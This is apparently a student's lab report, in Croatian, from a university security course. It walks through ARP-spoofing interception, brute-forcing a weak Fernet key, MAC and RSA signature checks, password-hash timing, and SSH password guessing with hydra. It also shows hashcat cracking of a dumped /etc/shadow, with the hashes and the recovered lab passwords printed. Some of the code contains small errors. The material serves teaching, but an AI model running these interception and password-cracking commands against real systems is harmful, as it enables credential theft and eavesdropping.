# Izvještaj laboratorijskih vježbi

# 1. Laboratorijska vježba

11.10.2021

## Zadatak

Realizirati man in the middle napad iskorištavanjem ranjivosti ARP protokola. Student će testirati napad u virtualiziranoj Docker mreži (Docker container networking) koju čine 3 virtualizirana Docker računala (eng. container): dvije žrtve **station-1** i **station-2** te napadač **evil-station**.

### Kloniranje GitHub repozitorija

```bash
git clone https://github.com/mcagalj/SRP-2021-22
```

### Ulazak u direktorij

```bash
cd SRP-2021-22/arp-spoofing/
```

### Running bash scripts

```bash
./start.sh
./stop.sh
```

### Pokrećanje iteraktivnog shella u station-1 kontenjeru

```python
docker exec -it station-1 bash
```

### Provjera nalazi li se station-2 na istoj mreži

```python
ping station-2
```

### Pokrećanje iteraktivnog shella u station-2 kontenjeru

```python
docker exec -it station-2 bash
```

### Pomoću netcat-a otvaramo server na portu 9000 na kontenjeru station-1

```python
netcat -lp 9000
```

### Pomoću netcat-a otvaramo client na hostname-u station-1 9000 na kontenjeru station-2

```python
netcat station-1 9000
```

### Pokrećanje iteraktivnog shella u evil-station kontenjeru

```python
docker exec -it evil-station bash
```

### Pokrećemo arpspoof u kontenjeru evil-station

```python
arpspoof -t station-1 station-2
```

### U kontenjeru evil-station pokrećemo tcpdump i pratimo promet

```python
tcpdump
```

```python
tcpdump -X host station-1 and not arp
```

### Prekidamo napad

```python
echo 0 > /proc/sys/net/ipv4/ip_forward
```

![Untitled](Izvjes%CC%8Ctaj%20laboratorijskih%20vjez%CC%8Cbi%207f8db425248d48e9bf2d2fa1cffd0156/Untitled.png)

# 2. Laboratorijska vježba

25.10.2021

U sklopu vježbe student će riješiti odgovarajući *crypto* izazov, odnosno dešifrirati odgovarajući *ciphertext* u kontekstu simetrične kriptografije. Izazov počiva na činjenici da student nema pristup enkripcijskom ključu.

Za pripremu *crypto* izazova, odnosno enkripciju korištena je Python biblioteka `[cryptography](https://cryptography.io/en/latest/)`. *Plaintext* koji student treba otkriti enkriptiran je korištenjem *high-level* sustava za simetričnu enkripciju iz navedene biblioteke - [Fernet](https://cryptography.io/en/latest/fernet/).

## Zadatak

Vaš izazov je rezultat enkripcije odgovarajućeg personaliziranog *plaintext*a korištenjem Fernet sustava.

### Kreiramo virutalno okruženje u pythonu

```python
C:\Users\A507\mcurlin> python -m venv mcurlin
```

### Ulazimo u direktorij i aktiviramo skriptu

```python
C:\Users\A507\mcurlin>cd mcurlin
```

```python
C:\Users\A507\mcurlin\mcurlin>cd Scripts
```

```python
C:\Users\A507\mcurlin\mcurlin\Scripts>activate
```

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin\Scripts>cd ..
```

### Instaliramo paket `[cryptography](https://cryptography.io/en/latest/)`

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin>pip install cryptography
```

### Koristimo Fernet

```python
from cryptography.fernet import fernet

#generiramo enkripcijski ključ
key = Fernet.generate.key()

#kreiramo Fernet objekt
f = Fernet(key)

plaintext = b"hello world"

#enkriptiramo sadržaj varijable plaintext
ciphertext = f.encrypt(plaintext)

#dekriptiramo sadržaj varijable ciphertext
deciphertext = f.decrypt(ciphertext)
```

### Izazov je pohranjen u datoteku čiji naziv generiramo na sljedeći format

```python
from cryptography.hazmat.primitives import hashes

def hash(input):
    if not isinstance(input, bytes):
        input = input.encode()

    digest = hashes.Hash(hashes.SHA256()) #SHA256 - kriptografska funkcija
    digest.update(input)
    hash = digest.finalize()

    return hash.hex()

filename = hash('curlin_marko') + ".encrypted"

if __name__ == "__main__":
    h = hash('curlin_marko')
    print(h)
```

### Rezultat

```python
ff6d035811b701ee4a6ac775203480f31045c18e99a49a7ba38ca9f2ec34c3de
```

### Za enkripciju smo koristili **ključeve ograničene entropije - 22 bita**. Ključevi su generirani na sljedeći način

```python

# Encryption keys are 256 bits long and have the following format:
 #           
 #              0...000b[1]b[2]...b[22] 
 #
 # where b[i] is a randomly generated bit.
 key = int.from_bytes(os.urandom(32), "big") & int('1'*KEY_ENTROPY, 2)
 
 # Initialize Fernet with the given encryption key;
 # Fernet expects base64 urlsafe encoded key.
 key_base64 = base64.urlsafe_b64encode(key.to_bytes(32, "big"))
 fernet = Fernet(key_base64)
```

### Koristeći brute force pristup tražimo enkripcijski ključ

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin>code brute_force.py
```

```python
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

def test_png(header):
    if header.startswith(b'\211PNG\032\n'): #header svakog png
        return True

def hash(input):
    if not isinstance(input, bytes):
        input = input.encode()

    digest = hashes.Hash(hashes.SHA256())
    digest.update(input)
    hash = digest.finalize()

    return hash.hex()

def brute_force():
    # Reading from a file
    filename = "ff6d035811b701ee4a6ac775203480f31045c18e99a49a7ba38ca9f2ec34c3de (1).encrypted"
    with open(filename, "rb") as file:
        ciphertext = file.read()
    # Now do something with the ciphertext
    ctr = 0

    while True:
        key_bytes = ctr.to_bytes(32, "big")
        key = base64.urlsafe_b64encode(key_bytes)
        if not (ctr + 1) % 1000: 
            print(f"[*] Key tested: {ctr + 1:,}", end="\r")

        # Now initialize the Fernet system with the given key
        # and try to decrypt your challenge.
        # Think, how do you know that the key tested is the correct key
        # (i.e., how do you break out of this infinite loop)?
        try:
            plaintext = Fernet(key).decrypt(ciphertext)
            header = plaintext[:32]

            if test_png(header):
                print(f"[+] KEY FOUND: {key}")
                
                # Writing to a file
                with open("BINGO.png", "wb") as file:
                    file.write(plaintext)
                break
            
            
        except Exception:
            pass
            
        ctr += 1

if __name__ == "__main__":
    brute_force()
```

# 3**. Laboratorijska vježba**

8.11.2021

Cilj vježbe je primjeniti teoreteske spoznaje o osnovnim kritografskim mehanizmima za autentikaciju i zaštitu integriteta poruka u praktičnom primjerima. Pri tome ćemo koristiti simetrične i asimetrične krito mehanizme: *message authentication code (MAC)* i *digitalne potpise* zasnovane na javnim ključevima.

### Kreiramo virutalno okruženje u pythonu

```python
C:\Users\A507\mcurlin> python -m venv mcurlin
```

### Ulazimo u direktorij i aktiviramo skriptu

```python
C:\Users\A507\mcurlin>cd mcurlin
```

```python
C:\Users\A507\mcurlin\mcurlin>cd Scripts
```

```python
C:\Users\A507\mcurlin\mcurlin\Scripts>activate
```

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin\Scripts>cd ..
```

### Instaliramo paket `[cryptography](https://cryptography.io/en/latest/)`

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin>pip install cryptography
```

## Izazov 1

Implementirajte zaštitu integriteta sadržaja dane poruke primjenom odgovarajućeg *message authentication code (MAC)* algoritma. Koristite pri tome HMAC mehanizam iz Python biblioteka `[cryptography](https://cryptography.io/en/latest/hazmat/primitives/mac/hmac/)`.

### U lokalnom direktoriju kreirali smo tekstualnu datoteku odgovarajućeg sadržaja čiji integritet želimo zaštititi.

### Učitavanje sadržaja datoteke u memoriju.

```python
 # Reading from a file
 with open(filename, "rb") as file:
     content = file.read()
```

### Funkcija za izračun MAC vrijednosti za danu poruku.

```python
from cryptography.hazmat.primitives import hashes, hmac

def generate_MAC(key, message):
if not isinstance(message, bytes):
message = message.encode()

h = hmac.HMAC(key, hashes.SHA256())
h.update(message)
signature = h.finalize()
return signature
```

### Kreiramo file sa porukom koju treba zaštititi, pročitamo poruku iz file-a i ispisujemo je na standardni izlaz.

```python
with open("message.txt", "rb") as file:
        content = file.read()

print(content)
```

### Rezultat

```python
19f85271dc375ff9229a8680cc4cfd6839e44e50bdc29c02c19b83ff751d16a3
```

### Spremanje u file `message.sig`

```python
from cryptography.hazmat.primitives import hashes, hmac

def generate_MAC(key, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    signature = h.finalize()
    return signature

if __name__ == "__main__":
    key =b"my super secret"

     # Reading from a file
    with open("message.txt", "rb") as file:
        content = file.read()   

    mac = generate_MAC(key, content)

    with open("message.sig", "wb") as file:
        file.write(mac)
```

### Funkcija za provjeru validnosti MAC-a za danu poruku.

```python
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.exceptions import InvalidSignature

def verify_MAC(key, signature, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    try:
        h.verify(signature)
    except InvalidSignature:
        return False
    else:
        return True
```

```python
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.exceptions import InvalidSignature

def verify_MAC(key, signature, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    try:
        h.verify(signature)
    except InvalidSignature:
        return False
    else:
        return True

def generate_MAC(key, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    signature = h.finalize()
    return signature

if __name__ == "__main__":
    key =b"my super secret"

     # Reading from a file
    with open("message.txt", "rb") as file:
        content = file.read()   

     # Reading from a file
    with open("message.sig", "rb") as file:
        mac = file.read()

    is_authentic = verify_MAC(key, mac, content)
    print(is_authentic)
```

## **Izazov 2**

U ovom izazovu **želite utvrditi vremenski ispravnu skevencu transakcija (ispravan redosljed transakcija) sa odgovarajućim dionicama**. Digitalno potpisani (primjenom MAC-a) nalozi za pojedine transakcije nalaze se na lokalnom web poslužitelju.

Sa servera preuzmite personalizirane izazove (direktorij `prezime_ime/mac_challege`). Nalozi se nalaze u datotekama označenim kao `order_<n>.txt` a odgovarajući autentikacijski kod (*digitalni potpis*) u datotekama `order_<n>.sig`.

### Osobne izazove preuzimamo naredbom u terminalu:

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin>wget.exe -r -nH -np --reject "index.html*" [http://a507-server.local/challenges/curlin_marko](http://a507-server.local/challenges/curlin_marko)
```

```python
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.exceptions import InvalidSignature

def verify_MAC(key, signature, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    try:
        h.verify(signature)
    except InvalidSignature:
        return False
    else:
        return True

def generate_MAC(key, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    signature = h.finalize()
    return signature

if __name__ == "__main__":
    # Reading from a file
    #with open("message.txt", "rb") as file:
    #    content = file.read()   

    # Reading from a file
    #with open("message.sig", "rb") as file:
    #   mac = file.read()

    key = "curlin_marko".encode()
    
    for ctr in range(1, 11):
        msg_filename = f"order_{ctr}.txt"
        sig_filename = f"order_{ctr}.sig"    
        print(msg_filename)
        print(sig_filename)

        with open(msg_filename, "rb") as file:
            content = file.read()
        with open(sig_filename, "rb") as file:
            mac = file.read()

        #mac = generate_MAC(key, content)

        is_authentic = verify_MAC(key, mac, content)

        print(f'Message {content.decode():>45} {"OK" if is_authentic else "NOK":<6}')
```

## **Digital signatures using public-key cryptography**

U ovom izazovu trebate odrediti autentičnu sliku (između dvije ponuđene) koju je profesor potpisao svojim privatnim ključem. Odgovarajući javni ključ dostupan je na gore navedenom serveru.

### Učitavanje javnog ključa iz datoteke

```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

def load_public_key():
    with open("public.pem", "rb") as f:
        PUBLIC_KEY = serialization.load_pem_public_key(
            f.read(),
            backend=default_backend()
        )
    return PUBLIC_KEY

 # Loading the public key
public_key = load_public_key()
print(public_key)
```

### Pokretanje programa

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin>python digital_signature.py
```

### Rezultat ispisa

```python
<cryptography.hazmat.backends.openssl.rsa._RSAPublicKey object at 0x0000020FEE1301C0>
```

### P**rovjera ispravnosti digitalnog potpisa**

```python
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.exceptions import InvalidSignature

def verify_signature_rsa(signature, message):
    PUBLIC_KEY = load_public_key()
    try:
        PUBLIC_KEY.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
    except InvalidSignature:
        return False
    else:
        return True
```

### Slika 1

```python
with open("image_1.sig", "rb") as file:
    signature = file.read()   

with open("image_1.png", "rb") as file:
    image = file.read()

is_authentic = verify_signature_rsa(signature, image);
print(is_authentic)
```

### Rezultat ispisa

```python
True
```

### Slika 2

```python
with open("image_2.sig", "rb") as file:
    signature = file.read()   

with open("image_2.png", "rb") as file:
    image = file.read()

is_authentic = verify_signature_rsa(signature, image);
print(is_authentic)
```

### Rezultat ispisa

```python
False
```

### Kod

```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.exceptions import InvalidSignature

def load_public_key():
    with open("public.pem", "rb") as f:
        PUBLIC_KEY = serialization.load_pem_public_key(
            f.read(),
            backend=default_backend()
        )
    return PUBLIC_KEY

def verify_signature_rsa(signature, message):
    PUBLIC_KEY = load_public_key()
    try:
        PUBLIC_KEY.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
    except InvalidSignature:
        return False
    else:
        return True

 # Loading the public key
#public_key = load_public_key()
#print(public_key)
 # Reading from a file

with open("image_1.sig", "rb") as file:
    signature = file.read()   

with open("image_1.png", "rb") as file:
    image = file.read()

is_authentic = verify_signature_rsa(signature, image);
print(is_authentic)
```

# 4**. Laboratorijska vježba**

6.12.2021

## **Password-hashing (iterative hashing, salt, memory-hard functions)**

Zaporke/lozinke su najzastupljeniji način autentikacije korisnika. U okviru vježbe upoznati ćemo se pobliže sa osnovnim konceptima relevantnim za sigurnu pohranu lozinki. Usporediti ćemo klasične (*brze*) kriptografske *hash* funkcije sa specijaliziranim (*sporim* i *memorijski zahtjevnim*) kriptografskim funkcijama za sigurnu pohranu zaporki i izvođenje enkripcijskih ključeva (*key derivation function (KDF)*).

### Instaliramo potrebne pakete

```python
pip install -r requirements.txt
```

### Kreiramo virutalno okruženje u pythonu

```python
C:\Users\A507\mcurlin> python -m venv mcurlin
```

### Ulazimo u direktorij i aktiviramo skriptu

```python
C:\Users\A507\mcurlin>cd mcurlin
```

```python
C:\Users\A507\mcurlin\mcurlin>cd Scripts
```

```python
C:\Users\A507\mcurlin\mcurlin\Scripts>activate
```

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin\Scripts>cd ..
```

### Instaliramo paket `[cryptography](https://cryptography.io/en/latest/)`

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin>pip install cryptography
```

### Izvršavamo program

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin>python password_hashing.py
```

### Rezultat

```python
+----------+----------------------+
| Function | Avg. Time (100 runs) |
+----------+----------------------+
| AES      |       0.000525       |
+----------+----------------------+

+----------+----------------------+
| Function | Avg. Time (100 runs) |
+----------+----------------------+
| HASH_MD5 |       3.4e-05        |
| AES      |       0.000525       |
+----------+----------------------+

+-------------+----------------------+
| Function    | Avg. Time (100 runs) |
+-------------+----------------------+
| HASH_SHA256 |       3.1e-05        |
| HASH_MD5    |       3.4e-05        |
| AES         |       0.000525       |
+-------------+----------------------+
```

### Proširujemo testove

```python
{
		  "name": "Linux CRYPTO 5k",
      "service": lambda: linux_hash(password, measure=True)
},
{
			"name": "Linux CRYPTO 1M",
      "service": lambda: linux_hash(password, rounds=10**6, measure=True)
}
```

### Rezultat

```python
+----------+----------------------+
| Function | Avg. Time (100 runs) |
+----------+----------------------+
| AES      |       0.000502       |
+----------+----------------------+

+----------+----------------------+
| Function | Avg. Time (100 runs) |
+----------+----------------------+
| HASH_MD5 |       3.4e-05        |
| AES      |       0.000502       |
+----------+----------------------+

+-------------+----------------------+
| Function    | Avg. Time (100 runs) |
+-------------+----------------------+
| HASH_SHA256 |        3e-05         |
| HASH_MD5    |       3.4e-05        |
| AES         |       0.000502       |
+-------------+----------------------+

+-----------------+----------------------+
| Function        | Avg. Time (100 runs) |
+-----------------+----------------------+
| HASH_SHA256     |        3e-05         |
| HASH_MD5        |       3.4e-05        |
| AES             |       0.000502       |
| Linux CRYPTO 5k |       0.006848       |
+-----------------+----------------------+

+-----------------+----------------------+
| Function        | Avg. Time (100 runs) |
+-----------------+----------------------+
| HASH_SHA256     |        3e-05         |
| HASH_MD5        |       3.4e-05        |
| AES             |       0.000502       |
| Linux CRYPTO 5k |       0.006848       |
| Linux CRYPTO 1M |       1.353732       |
+-----------------+----------------------+
```

### Kod

```python
from os import urandom
from prettytable import PrettyTable
from timeit import default_timer as time
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from passlib.hash import sha512_crypt, pbkdf2_sha256, argon2

def time_it(function):
    def wrapper(*args, **kwargs):
        start_time = time()
        result = function(*args, **kwargs)
        end_time = time()
        measure = kwargs.get("measure")
        if measure:
            execution_time = end_time - start_time
            return result, execution_time
        return result
    return wrapper

@time_it
def aes(**kwargs):
    key = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
    ])

    plaintext = bytes([
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ])

    encryptor = Cipher(algorithms.AES(key), modes.ECB()).encryptor()
    encryptor.update(plaintext)
    encryptor.finalize()

@time_it
def md5(input, **kwargs):
    digest = hashes.Hash(hashes.MD5(), backend=default_backend())
    digest.update(input)
    hash = digest.finalize()
    return hash.hex()

@time_it
def sha256(input, **kwargs):
    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(input)
    hash = digest.finalize()
    return hash.hex()

@time_it
def sha512(input, **kwargs):
    digest = hashes.Hash(hashes.SHA512(), backend=default_backend())
    digest.update(input)
    hash = digest.finalize()
    return hash.hex()

@time_it
def pbkdf2(input, **kwargs):
    # For more precise measurements we use a fixed salt
    salt = b"12QIp/Kd"
    rounds = kwargs.get("rounds", 10000)
    return pbkdf2_sha256.hash(input, salt=salt, rounds=rounds)

@time_it
def argon2_hash(input, **kwargs):
    # For more precise measurements we use a fixed salt
    salt = b"0"*22
    rounds = kwargs.get("rounds", 12)              # time_cost
    memory_cost = kwargs.get("memory_cost", 2**10) # kibibytes
    parallelism = kwargs.get("rounds", 1)
    return argon2.using(
        salt=salt,
        rounds=rounds,
        memory_cost=memory_cost,
        parallelism=parallelism
    ).hash(input)

@time_it
def linux_hash_6(input, **kwargs):
    # For more precise measurements we use a fixed salt
    salt = "12QIp/Kd"
    return sha512_crypt.hash(input, salt=salt, rounds=5000)

@time_it
def linux_hash(input, **kwargs):
    # For more precise measurements we use a fixed salt
    salt = kwargs.get("salt")
    rounds = kwargs.get("rounds", 5000)
    if salt:
        return sha512_crypt.hash(input, salt=salt, rounds=rounds)
    return sha512_crypt.hash(input, rounds=rounds)

@time_it
def scrypt_hash(input, **kwargs):
    salt = kwargs.get("salt", urandom(16))
    length = kwargs.get("length", 32)
    n = kwargs.get("n", 2**14)
    r = kwargs.get("r", 8)
    p = kwargs.get("p", 1)
    kdf = Scrypt(
        salt=salt,
        length=length,
        n=n,
        r=r,
        p=p
    )
    hash = kdf.derive(input)
    return {
        "hash": hash,
        "salt": salt
    }

if __name__ == "__main__":
    ITERATIONS = 100
    password = b"super secret password"

    MEMORY_HARD_TESTS = []
    LOW_MEMORY_TESTS = []

    TESTS = [
        {
            "name": "AES",
            "service": lambda: aes(measure=True)
        },
        {
            "name": "HASH_MD5",
            "service": lambda: sha512(password, measure=True)
        },
        {
            "name": "HASH_SHA256",
            "service": lambda: sha512(password, measure=True)
        },
        {
            "name": "Linux CRYPTO 5k",
            "service": lambda: linux_hash(password, measure=True)
        },
        {
            "name": "Linux CRYPTO 1M",
            "service": lambda: linux_hash(password, rounds=10**6, measure=True)
        }
    ]

    table = PrettyTable()
    column_1 = "Function"
    column_2 = f"Avg. Time ({ITERATIONS} runs)"
    table.field_names = [column_1, column_2]
    table.align[column_1] = "l"
    table.align[column_2] = "c"
    table.sortby = column_2

    for test in TESTS:
        name = test.get("name")
        service = test.get("service")

        total_time = 0
        for iteration in range(0, ITERATIONS):
            print(f"Testing {name:>6} {iteration}/{ITERATIONS}", end="\r")
            _, execution_time = service()
            total_time += execution_time
        average_time = round(total_time/ITERATIONS, 6)
        table.add_row([name, average_time])
        print(f"{table}\n\n")
```

## 5**. Laboratorijska vježba**

20.12.2021

## Zadatak

Online and Offline Password Guessing Attacks

## **Online Password Guessing**

Open bash shell in WSL on your local Windows machine.

### Install `nmap` application. In the bash shell execute the following commands.

```jsx
Nmap done: 16 IP addresses (12 hosts up) scanned in 17.62 seconds
```

### Pokrenut ssh - default port 22

```
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ ssh curlin_marko@10.0.15.7
```

### Rezultat

```
The authenticity of host '10.0.15.7 (10.0.15.7)' can't be established.
ECDSA key fingerprint is SHA256:u4rEaCKzOum3w9z1y+9B+DW/uDhp020DQXH4Sso12ns.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.0.15.7' (ECDSA) to the list of known hosts.
curlin_marko@10.0.15.7's password:
Permission denied, please try again.
```

### Install `hydra` application

```
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ hydra -l curlin_marko -x 4:6:a 10.0.15.7 -V -t 1 ssh
```

### Get the dictionary from [http://a507-server.local:8080/](http://a507-server.local:8080/) as follows (please mind the **group ID**).

```
wget -r -nH -np --reject "index.html*" http://a507-server.local:8080/dictionary/g1/
```

### Finally, use `hydra` with the dictionary as shown below (IMPORTANT: use `dictionary_online.txt`).

```
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ hydra -l curlin_marko -P dictionary/g2/dictionary_online.txt 10.0.15.7 -V -t
4 ssh
```

```
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 808 to do in 00:13h, 4 active
```

### Rezultat

```
[22][ssh] host: 10.0.15.7   login: curlin_marko   password: meofth
```

```
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ ssh curlin_marko@10.0.15.7
curlin_marko@10.0.15.7's password:
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

## **Offline Password Guessing**

### For this task, use `hashcat` tool. Install it on your local machine as follows.

```
sudo apt-get install hashcat

# Test it
hashcat
```

### Password hash

```
curlin_marko@host_curlin_marko:~$ groups
curlin_marko sudo
curlin_marko@host_curlin_marko:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
curlin_marko@host_curlin_marko:~$ sudo cat /etc/shadow
[sudo] password for curlin_marko:
root:*:18900:0:99999:7:::
daemon:*:18900:0:99999:7:::
bin:*:18900:0:99999:7:::
sys:*:18900:0:99999:7:::
sync:*:18900:0:99999:7:::
games:*:18900:0:99999:7:::
man:*:18900:0:99999:7:::
lp:*:18900:0:99999:7:::
mail:*:18900:0:99999:7:::
news:*:18900:0:99999:7:::
uucp:*:18900:0:99999:7:::
proxy:*:18900:0:99999:7:::
www-data:*:18900:0:99999:7:::
backup:*:18900:0:99999:7:::
list:*:18900:0:99999:7:::
irc:*:18900:0:99999:7:::
gnats:*:18900:0:99999:7:::
nobody:*:18900:0:99999:7:::
_apt:*:18900:0:99999:7:::
systemd-network:*:18977:0:99999:7:::
systemd-resolve:*:18977:0:99999:7:::
messagebus:*:18977:0:99999:7:::
sshd:*:18977:0:99999:7:::
curlin_marko:$6$smeEaTSxv4DvWxRK$qUGhselUQN0XgDUTI2f23fOG711jdwzC8d8yJVYEZYRniaRvPbWu0/H4UgtfYGItizmxCgySco83VqwiLEJdZ.:18981:0:99999:7:::
jean_doe:$6$ZTBxJWokFkTTfPr7$NmuV4F5AKw6UApBKzYJgJDSbdYBnzfGLQymSl2dA0ML6QdC.eLebfqrtcSYd7GgqbLAq6sLDdRIjDHlHxuYHd.:18981:0:99999:7:::
john_doe:$6$T8b9s5tzpAAsmJjD$L89PROtJW1tpc4BD.SpN8mB4GQODlYu0Waaab0OkbHXUXlG9k5G.QC7U17cqubwYEoFlfRCtaUzHomGGBg6Pl0:18981:0:99999:7:::
alice_cooper:$6$Wp6taMzmh19nNjYi$JFJYxL.sREmUabIkx8bbvVDEskj3EW0ZzaZkxoxdLBEBMseSMY.LmpqW3Xetdhg3.n9FysSG2ChJYByIh50vJ.:18981:0:99999:7:::
john_deacon:$6$z/wAta7.2gI8sReV$VdkE/oSDa6Zp.b/Gwic9xcpxCevw7Hc.3aV8t3RB.seYtDhz63CDQqX5ascIBDc1vjJiPMhVtQPEO88U7u9s41:18981:0:99999:7:::
freddie_mercury:$6$MSulKvrcvg0BY9Mc$70hwqUsWMGHruHKD3x3ROR3lsVI2nVdu5ZYU6tYjNCwsEi5Md/ZlU50vtIIsZ8CYPok5/5tKHacGhreMQbeDf1:18981:0:99999:7:::
```

### Save the password hash obtained in the previous task into a file. To make this step somewhat easier, open the present folder in Visual Studio Code by running the following command.

```
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ code .
```

### Start offline guessing attack by executing the following command. As in the previous task you know the following about the password:

```
hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10
```

### If the attack from the previous step is not feasible approach, try a dictionary-based guessing attack

```
hashcat --force -m 1800 -a 0 hash.txt dictionary/g2/dictionary_offline.txt --status --status-timer 10
```

### Rezultat

```
ragtou

```